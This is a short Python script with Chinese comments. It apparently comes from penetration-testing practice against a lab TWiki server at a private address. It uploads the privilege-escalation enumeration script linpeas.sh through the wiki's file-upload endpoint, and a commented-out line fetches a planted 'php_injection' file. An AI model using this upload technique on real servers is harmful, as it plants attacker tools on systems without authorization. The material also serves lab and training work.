import requests
from datetime import datetime

# 定義上傳文件的 URL
url = 'http://192.168.56.101:80/twiki/bin/upload/Main/WebHome'

# 構造表單數據
data = {
    'createlink': 'on',  # 勾選 'createlink' 複選框
    'filecomment': 'This is a test file'  # 添加文件的評論
}

# 構造要上傳的文件
with open('/home/kali/Desktop/attack_script/linpeas.sh', 'rb') as file_to_upload:
    files = {
        'filepath': ('linpeas.sh', file_to_upload, 'text/plain')
    }

    # 發送 POST 請求，模擬表單上傳文件
    response = requests.post(url, files=files, data=data)

# 檢查請求的響應
if response.status_code == 200:
    print("File uploaded successfully")

    # 發送 GET 請求以獲取上傳的文件，並在 3 秒後自動斷開請求
    # res = requests.get("http://192.168.56.101/twiki/pub/Main/WebHome/php_injection.php.txt", timeout=3)

else:
    print(f"Failed to upload file. Status code: {response.status_code}")
    print(response.text)  # 打印錯誤信息
